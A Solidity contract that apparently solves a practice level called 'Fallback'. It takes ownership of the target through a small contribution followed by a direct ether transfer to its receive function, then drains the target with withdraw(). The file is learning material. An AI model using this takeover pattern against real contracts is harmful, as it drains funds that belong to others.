// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Goals
// 1. became the owner of Fallback contract
// 2. withdraw all ether from it

contract Exploit {
    address public target;

    //target - address of Fallback contract
    constructor(address _target) {
        target = _target;
    }

    //send exactly 0.001 (1000000 gwei) ether to this func
    function exploit() external payable {
        require(target != address(0),"set a target");
        
        (bool ok,) = target.call{value: msg.value/2}(
            abi.encodeWithSignature("contribute()")
        );
        require(ok, "contribute() failed");

        (ok, ) = target.call{value: msg.value/2}("");
        require(ok,"receive() failed");

        (ok, ) = target.call(
            abi.encodeWithSignature("withdraw()")
        );
        require(ok, "withdraw() failed");

    }

    receive() external payable {}

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }
}
